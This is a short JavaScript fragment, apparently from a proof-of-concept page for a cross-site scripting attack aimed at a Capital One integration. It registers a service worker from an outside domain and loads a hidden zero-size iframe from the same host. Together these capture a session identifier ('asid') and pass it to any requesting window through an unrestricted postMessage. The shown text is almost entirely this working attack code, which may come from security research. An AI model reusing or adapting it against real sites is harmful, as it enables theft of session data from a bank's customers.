            function on_load()
            {
                /***** Ugly hack to get the current asid  - we register a SW that captures all traffic, and load a mock in an iframe. Once the mock will send the request for the asid, the SW will intercept the response and post it to here **/
                
                navigator.serviceWorker.register('//avishayrd.online/capitalone/cxss/sw.js');
                
                const channel = new BroadcastChannel('sw-messages');
                channel.addEventListener('message', event => {
                   window.asid = JSON.parse(event.data.res).as;
                   
                  window.addEventListener("message", function(e)
                   {
                       if (e.data!='get_asid') return;
                       e.source.postMessage("ASID="+window.asid,'*');
                       document.body.removeChild(document.getElementById("ASID"));

                   })
                });
       
                let ifr = document.createElement("iframe");
                ifr.width=ifr.height="0px";
                ifr.src='//avishayrd.online/capitalone/cxss/getAsid.html?clientKey=cap1enterprise-v1-001'
                document.body.appendChild(ifr);
            }
        </script>
